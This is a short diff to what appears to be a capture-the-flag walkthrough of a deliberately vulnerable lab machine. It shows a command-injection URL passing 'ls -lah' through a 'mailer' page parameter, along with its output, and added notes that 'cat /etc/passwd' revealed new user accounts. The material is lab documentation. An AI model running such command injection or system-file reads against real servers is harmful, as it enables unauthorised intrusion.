@@ -146,3 +146,12 @@ http://192.168.x.x:60080/?page=mailer&mail=ls%20-lah
 > root 16K Aug 11 2015 eye.jpg -rw-r--r-- 1 root root 3.6K Dec 27 19:19 index.php drwxr-xr-x 2 root root 4.0K Dec 27 12:25 
 > s13!34g$3FVA5e@ed -rw-r--r-- 1 root root 57K Dec 27 12:24 sec.png -rw-r--r-- 1 www-data www-data 12 Jan 3 07:26 uname.txt
 > Coming Soon guys!
+
+Running `cat /etc/passwd` gave us some different entries than pre-LFI reset:
+*  `wallaby:x:1001:1001::/home/wallaby:/bin/bash`
+*  `waldo:x:1000:1000:waldo,,,:/home/waldo:/bin/bash`
+
+And while IRC is back, it now has an accompanying bot:
+
+*  `ircd:x:1003:1003:,,,:/home/ircd:/bin/bash`
+*  `sopel:x:110:118:Sopel IRC bot,,,:/var/lib/sopel:/bin/false`
